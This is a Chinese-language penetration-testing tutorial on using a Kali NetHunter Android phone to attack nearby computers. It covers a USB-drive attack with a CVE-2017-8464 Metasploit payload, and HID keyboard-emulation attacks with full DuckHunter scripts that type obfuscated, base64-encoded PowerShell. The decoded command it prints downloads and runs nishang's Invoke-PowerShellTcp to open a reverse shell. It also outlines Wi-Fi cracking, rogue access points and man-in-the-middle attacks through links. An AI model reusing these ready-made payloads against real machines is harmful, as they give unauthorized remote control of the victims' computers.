> 原文链接: https://www.anquanke.com//post/id/86651 


# 【技术分享】走到哪黑到哪——Android渗透测试三板斧


                                阅读量   
                                **263680**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**<br>**

**[![](https://p1.ssl.qhimg.com/t01e2a93b828fd6ff3d.png)](https://p1.ssl.qhimg.com/t01e2a93b828fd6ff3d.png)**

****

作者：[for_while](http://bobao.360.cn/member/contribute?uid=2553709124)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**前言**<br>

****

在本文中将介绍三种使用 Android设备进行渗透测试的思路。本文中的大多数使用基于 Kali Nethunter.



**安装 Kali Nethunter**

****

kali nethunter 是在已有的 rom上对内核进行修改而定制的一个系统，他通过 chroot 来在安卓设备中运行 kali。故在安装 kali nethunter前你得先有一个被支持的rom.官方支持的设备和rom列表： [https://github.com/offensive-security/kali-nethunter/wiki](https://github.com/offensive-security/kali-nethunter/wiki) 。这里我用的是 nexus4 ，其他设备的流程应该大概差不多。具体流程如下：

根据官方的支持列表刷入 对应支持的 rom , 为了方便可以使用 [刷机精灵](http://www.shuame.com/) 进行刷机，我的是nexus4 ,刷cm13, 使用这个镜像 [http://www.romzj.com/rom/61429.htm](http://www.romzj.com/rom/61429.htm)  。<br>

从 [https://build.nethunter.com/nightly/](https://build.nethunter.com/nightly/)  下载对应的 kernel-nethunter-makocm&lt;适配设备mako nexus4&gt;-marshmallow&lt;版本号，cm13是 android 6.0 &gt;-* 和 nethunter-generic-armhf&lt;架构，nexus4为armv7 32位&gt; android-kalifs-full-rolling-* ， 然后使用 [twrp](https://twrp.me/) 先刷 kalifs ， 然后刷入 kernel.

**<br>**

**遇到的问题**

****

nethunter app会卡死在 复制脚本文件那，我注释掉了那两句复制文件的代码，手动把apk中asserts目录下的**相应目录**复制为： /data/data/com.offsec.nethunter/files/`{`etc,scripts`}` 和 /sdcard/nh_files 

在windows下复制脚本到linux, 会因为**换行符的问题导致脚本不能执行**， 使用 [dos2unix](https://sourceforge.net/projects/dos2unix/) 对文件进行转换

com.offsec.nhterm （用于开启、使用 kali的命令行界面）会报错，使用 [https://github.com/madScript01/install_nh](https://github.com/madScript01/install_nh)  中的Term-nh.apk 把它替换掉。

为了方便后面的实验，开启 ssh服务，使用PC连接(默认用户名密码： root/toor)， 真正去渗透时我们可以把一些常用的命令写成脚本方便直接运行。

开启ssh

[![](https://p5.ssl.qhimg.com/t0192674bd657c6dc7d.gif)](https://p5.ssl.qhimg.com/t0192674bd657c6dc7d.gif)



**思路一：普通U盘类攻击**

****

在nethunter安装完后，会有一个 DroidDrive 的app, 我们可以用它来创建一个镜像，然后挂载，然后我们的安卓手机就可以当U盘来用了。具体过程看下面。



                                    [![](https://p2.ssl.qhimg.com/t0146833ba2902c731b.gif)](https://p2.ssl.qhimg.com/t0146833ba2902c731b.gif)

点击需要挂载的镜像，然后会有几种挂载方式，这里使用第二种就行。弄好后，用usb线接入电脑，会提示 需要格式化 ，格式化后就和普通的U盘一样用了。

U盘攻击很早之前就有了，那时使用 **autorun.inf** 来传播病毒， 下面要介绍的是使用 最近的 **cve-2017-8464** 的 exp来进行攻击。首先使用msf生成 payload

[![](https://p2.ssl.qhimg.com/t012024479735395e79.jpg)](https://p2.ssl.qhimg.com/t012024479735395e79.jpg)

根据你的U盘在pc上识别为什么盘(A,B,…)来复制相应的 .lnk文件 和 .dll。为了通用把他们全复制到u盘根目录。然后设置好 handler:

[![](https://p4.ssl.qhimg.com/t01bf89a5ed2d2abcf4.jpg)](https://p4.ssl.qhimg.com/t01bf89a5ed2d2abcf4.jpg)

插入U盘，打开我的电脑，就会反弹shell了。



**思路二：HID攻击**

****

通过HID攻击，我们可以通过USB线来模拟键盘鼠标的操作，这样我就可以在目标上执行恶意代码。Kali Nethunter中有两种 HID攻击payload生成方式。第一种就是下面这个：

手机通过USB连到 PC ,然后：

[![](https://p4.ssl.qhimg.com/t01607d0da8c564d992.gif)](https://p4.ssl.qhimg.com/t01607d0da8c564d992.gif)

电脑上会打开 cmd, 执行 ipconfig：





这种方式非常简单，但是不够灵活。当机器的默认输入法为中文时，命令输入有时是会出问题的，比如输入 " （英文双引号）时 会变成 “（中文双引号）。

我建议用下面的那个** DuckHunter HID** 模式进行这种方式的攻击。

该模式 允许我们使用 Usb Rubber Ducky的语法来实现  HID攻击，此外该模式还提供了一个 Preview 的选项卡，通过它我们可以发现其实HID攻击实际上就是使用 shell命令向 /dev/hidg0 发送数据，之后该设备就会将他们转换为键盘或者鼠标的操作。

后来在Github瞎找，找到了一个针对该模式生成shell脚本的项目： [https://github.com/byt3bl33d3r/duckhunter](https://github.com/byt3bl33d3r/duckhunter) 使用它我们可以很方便的对脚本进行测试（写完Usb Rubber Ducky脚本用该工具生成shell脚本然后再 Nethunter上运行 shell脚本。），同时该项目还提供了简单的 Usb Rubber Ducky的语法。

此时我们就能通过Nethunter向主机输入各种的键盘按键，组合键等。所以对于上面提出的 中文问题。我们可以在需要输入字符时，发送shift键切换到英文就行了。

一个通过执行 powershell 反弹shell的脚本示例：

```
DELAY 1000
GUI r
DELAY 1000
SHIFT
DELAY 1000
SPACE
SPACE
STRING cmd
DELAY 2000
ENTER
SHIFT
DELAY 2000
ENTER
SPACE
STRING powershell -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYgBZAHEAeABEAG8ASQB3AEYARQBWADMARQB2ADYAaABZAFkASwBCAFYAbgBRAHcAYwBUAFAAcQB3AEkASgBFAFQASABRAHQAOABFAEkAcgAwAEoATAAzAEgAdgBEADcARQBtAGYAUAAzAGMANAA5ACsAZQAwAGQARgA3AEMAbQA5AC8AbwBEAEQAWQBzAEMAVwBMADYAZwB2AGcAdwBXAEgAQwBmAHkANgBsAGMAMwBlAE4AMQBXAGoATgBaADEAYwBXAFMAWQBKAHoAbwBwAGgAWABxAFYAbgBXAFUAegAxAHoATQBCAE4AdAA3AHgAbABzAHYARwBqADQAcgAwAGkASgBvADEARwBkADgAcgBaADgAbABvADEANgBsAFIARQB3AE8AcQB5AHMAQQB3AGsATQByAGQANABuAHQASQBTADcAOABDAC8AdABTAHoAbQBlAFIARQBXAFoAUwBFAHcAYgA5AFAAcABBADkAWQBBAEEAbABFAG0AcABmAG4AdABrAFUAZwBFAHQAbgArAEsASABmAGIATQByAEgARgB5AE8ASwB3AEUAUQBaAGYAJwApACkAKQApACwAIABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAIABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==
ENTER
STRING over......
```

tips:

在中文输入法为默认输入法时，在需要输入字符前，使用 shift 切换为 英文。尽量使用小写，因为大写的字符有时输入不了。

命令前可以插延时，回车， 空格 规避一些错误

powershell 执行的命令是使用了[nishang](https://github.com/samratashok/nishang)的 Invoke-Encode.ps1模块进行的编码。详细请看：[http://m.bobao.360.cn/learning/detail/3200.html](http://m.bobao.360.cn/learning/detail/3200.html)

编码前的powershlle要执行的命令为

```
IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1")
Invoke-PowerShellTcp -Reverse -IPAddress 127.0.0.1 -Port 3333
```

保存到文件，传到手机，在Nethunter中导入，运行（已连接电脑的前提下）。

然后电脑上就会输入 并执行

[![](https://p2.ssl.qhimg.com/t01c4e037d2235961c0.jpg)](https://p2.ssl.qhimg.com/t01c4e037d2235961c0.jpg)

然后就可以拿到shell

现在有个问题就是使用这种方式拿到的shell会在 pc上有 黑框， 关闭黑框shell就断了。这里我决定使用 metasploit的 meterpreter来解决这一问题。

1. 首先生成powershell的payload, 传到可访问的地址<br>

2. 开启hander, 同时设置自动运行脚本，当shell过来时，自动迁移进程

3. 在目标机器远程调用执行payload

4. 执行完后sleep 几秒，以保证 msf 能够成功迁移进程。

5. 关闭命令行

生成 payload 和 开启handler 设置自动迁移进程

[![](https://p2.ssl.qhimg.com/t0148ba382e8ce57aea.jpg)](https://p2.ssl.qhimg.com/t0148ba382e8ce57aea.jpg)

为了简单，复制 生成的 powershell脚本 到本地的web服务器。使用nishang对下面的脚本编码。

我这sleep 15秒等待msf迁移进程。编码后，最终DuckHunter HID攻击脚本

```
DELAY 1000
GUI r
DELAY 1000
SHIFT
DELAY 1000
SPACE
SPACE
STRING cmd
DELAY 2000
ENTER
SHIFT
DELAY 2000
ENTER
SPACE
STRING powershell -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAOAAzAFMATgAwAFAAQgBMAEwAZABmADEAVAA4AHAASwBUAFMANQBSADgARQBzAHQAMABRAHQAUABUAFgATABPAHkAVQB6AE4ASwA5AEgAVQBjADgAawB2AHoAOAB2AEoAVAAwAHcASgBMAGkAbgBLAHoARQB2AFgAVQBNAG8AbwBLAFMAbQB3ADAAdABjADMATgBEAEwAWABNAHcAQgBDAFEALwAzAFUAaQBnAEsAOQBnAG0ASgBEAEoAVQAxAGUAcgB1AEMAUwB4AEsASQBTADMAZQBDAGMAMQBOAFEAQwBCAGQAMwBnADEATwBUADgAdgBKAFIAaQBCAFUATgBUAFgAaQA0AEEAJwApACkAKQApACwAIABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAIABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==
ENTER
STRING exit
ENTER
```

执行后 ，msf的输出

[![](https://p1.ssl.qhimg.com/t01ce4f281be3ce1015.jpg)](https://p1.ssl.qhimg.com/t01ce4f281be3ce1015.jpg)



**思路三：无线攻击**



在手机上使用 otg 功能外接支持 monitor 的网卡，然后就和在 pc上使用 kali是一样的了。由于 nexus4 不支持 otg, 同时该方面的攻击网上也有很多文章介绍。下面说下思路并附上一些相关链接。

1. 破解wifi密码

2. 伪造ap，获取wifi密码

3. 进入wifi后，中间人攻击，嗅探，伪造更新。。。

**破解wifi密码**

破解wifi可以使用 aircrack-ng进行破解, 抓握手包，然后跑包（自己跑或者云平台）或者 直接使用 wifite 自动化的来。

[http://www.cnblogs.com/youcanch/articles/5672325.html](http://www.cnblogs.com/youcanch/articles/5672325.html) 

[http://blog.csdn.net/whackw/article/details/49500053](http://blog.csdn.net/whackw/article/details/49500053) 

**伪造ap，获取wifi密码**

通过伪造wifi 名 并把目标ap连接的 合法 ap 打下线迫使他们重连wifi,增大钓鱼的成功率。<br>

[https://github.com/P0cL4bs/WiFi-Pumpkin/](https://github.com/P0cL4bs/WiFi-Pumpkin/) 

[https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) 

**中间人攻击**

这方面的攻击和文章很多。最近测试了一下感觉还是 [MItmf ](https://github.com/byt3bl33d3r/MITMf)最强，基本满足了所有的需求。强烈推荐。<br>

[https://github.com/byt3bl33d3r/MITMf/wiki](https://github.com/byt3bl33d3r/MITMf/wiki) 

[http://www.freebuf.com/sectool/45796.html](http://www.freebuf.com/sectool/45796.html)



**参考链接**

****

[https://github.com/offensive-security/kali-nethunter/wiki](https://github.com/offensive-security/kali-nethunter/wiki)

[https://www.52pojie.cn/thread-520380-1-1.html](https://www.52pojie.cn/thread-520380-1-1.html)

[http://wooyun.jozxing.cc/static/drops/tips-4634.html](http://wooyun.jozxing.cc/static/drops/tips-4634.html)
